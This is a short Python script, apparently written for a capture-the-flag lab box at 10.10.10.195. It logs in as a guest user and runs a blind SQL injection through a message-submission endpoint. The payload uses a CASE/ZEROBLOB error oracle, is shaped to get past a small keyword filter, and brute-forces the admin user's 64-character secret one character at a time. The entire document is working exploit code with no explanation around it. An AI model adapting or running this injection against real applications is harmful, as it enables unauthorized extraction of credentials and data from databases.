import string
from requests import Session

s = Session()
s.post("http://10.10.10.195/postlogin", data={"username": "guest", "password": "guest"})

def inject(condition):
    payload = "'),((SELECT CASE WHEN %s THEN 1 ELSE ZEROBLOB(1000000000) END))--" % condition
    assert len(payload) <= 140
    assert all(x not in payload for x in ["rand", "system", "exec", "date"])

    res = s.post("http://10.10.10.195/submitmessage", data={"message": payload})
    if res.status_code != 200 or (res.text != "OK" and res.text != "string or blob too big"):
        print("We've failed it: [%d] %s" % (res.status_code, res.text))
        exit()

    return res.status_code == 200 and res.text == "OK"

def brute_secret():
    condition = "(SELECT substr(secret, %d, 1) FROM users WHERE username='admin' LIMIT 1)='%s'"
    guessed = ""
    # SHA256 is 64 chars long
    for _ in range(64):
        prev_len = len(guessed)
        for c in string.digits + string.ascii_lowercase:
            if inject(condition % (len(guessed) + 1, c)):
                guessed += c
                break

        assert prev_len + 1 == len(guessed)

    return guessed

print("Secret: " + brute_secret())
